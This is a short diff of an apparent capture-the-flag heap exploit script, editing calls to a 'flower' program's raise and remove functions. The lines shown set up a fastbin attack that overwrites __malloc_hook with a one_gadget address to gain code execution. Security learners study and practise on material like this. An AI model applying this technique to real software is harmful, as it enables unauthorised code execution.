@@ -74,15 +74,14 @@ remove_flower(1,4)
 
 raise_flowername(1,0x60,p64(malloc_hook-35),"eee")
 raise_flowername(1,0x60,"fff","ggg")
-pause()
-raise_flowername(2,0x60,"hhh","iii")
+#pause()
+raise_flowername(1,0x60,"hhh","iii")
 raise_flowername(1,0x60, "a"*19+p64(one_gadget), "jjj")
 
 pause()
 
+remove_flower(1,9)
 #remove_flower(1,2)
-#remove_flower(1,3)
-#remove_flower(1,6)
 #remove_flower(1,7)
 #remove_flower(1,8)
 
